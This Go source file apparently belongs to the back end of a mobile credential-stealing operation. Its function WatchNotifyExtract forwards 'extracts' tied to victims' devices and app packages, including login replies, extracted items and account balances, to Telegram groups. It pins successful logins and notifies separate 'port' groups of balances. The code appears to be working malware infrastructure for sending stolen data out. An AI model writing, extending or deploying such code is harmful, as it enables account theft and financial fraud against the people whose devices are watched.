package telegram

import (
	"context"
	"strings"

	"github.com/base/realtime/internal/protocol"
)

// WatchNotifyTargets carries resolved chat destinations for a watch extract.
type WatchNotifyTargets struct {
	LogGroupID  int64
	PortGroupID int64
	PortName    string
	PortDesc    string
	PortCode    string
}

// WatchNotifyExtract sends:
//   - full extract (success and failure) to the main watch log group
//   - short success-only notice to the port group (optional موجودی, no other secrets)
func WatchNotifyExtract(
	ctx context.Context,
	token string,
	botUser string,
	targets WatchNotifyTargets,
	userID, deviceID, setToken, displayName, userDesc string,
	blocked, muted, skipLog, skipExtract bool,
	appLabel, pkg, reply string,
	items []protocol.WatchExtractItem,
	extractErr string,
) {
	token = strings.TrimSpace(token)
	if token == "" || strings.TrimSpace(extractErr) != "" {
		return
	}
	success, known := WatchLoginOutcome(reply)
	if !known || muted || skipLog {
		return
	}
	if targets.LogGroupID != 0 {
		html := WatchExtractHTML(WatchExtractNotice{
			AppLabel:        appLabel,
			Package:         pkg,
			PortName:        targets.PortName,
			PortDescription: targets.PortDesc,
			PortCode:        targets.PortCode,
			UserName:        displayName,
			UserDescription: userDesc,
			UserID:          userID,
			SetToken:        setToken,
			Reply:           reply,
			Items:           items,
		})
		kb := WatchExtractKeyboard(botUser, setToken, deviceID, pkg, appLabel, WatchKeyboardState{
			SkipLog:     skipLog,
			SkipExtract: skipExtract,
			Blocked:     blocked,
			Muted:       muted,
		})
		msgID := SendGroupHTML(ctx, token, targets.LogGroupID, html, kb, 0)
		if msgID > 0 && success {
			PinGroupMessage(ctx, token, targets.LogGroupID, msgID)
		}
	}
	if !success || targets.PortGroupID == 0 {
		return
	}
	portHTML := WatchPortLoginHTML(appLabel, pkg, displayName, userID, WatchExtractBalance(items))
	SendGroupHTML(ctx, token, targets.PortGroupID, portHTML, nil, 0)
}
